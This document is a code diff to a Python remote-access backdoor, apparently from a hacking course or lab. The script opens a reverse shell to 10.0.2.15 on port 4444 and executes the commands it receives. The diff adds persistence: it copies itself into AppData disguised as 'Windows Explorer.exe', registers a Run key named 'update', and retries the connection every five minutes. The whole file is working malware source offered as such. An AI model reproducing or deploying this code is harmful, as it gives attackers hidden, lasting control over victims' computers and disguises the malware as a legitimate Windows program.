@@ -1,11 +1,18 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json, os, base64, sys
+import socket, subprocess, json, os, base64, sys, time, shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+file_location+'"',shell=True)
 
     def execute_system_command(self,command):
         DEVNULL = open(os.devnull, 'wb')
@@ -56,5 +63,16 @@ class Backdoor:
                 command_result = "[-] Error during command execution."
             self.reliable_send("\n" + command_result + "\n")
 
-my_backdoor = Backdoor("10.0.2.15", 4444)
-my_backdoor.run()
+
+def pop_shell():
+    try: 
+        my_backdoor = Backdoor("10.0.2.15", 4444)
+        my_backdoor.run()
+    except Exception:
+        # if we couldn't connect to the shell, wait 5 minutes and try again
+        time.sleep(60*5)
+        pop_shell()
+
+if __name__ == "__main__":
+    pop_shell()
+
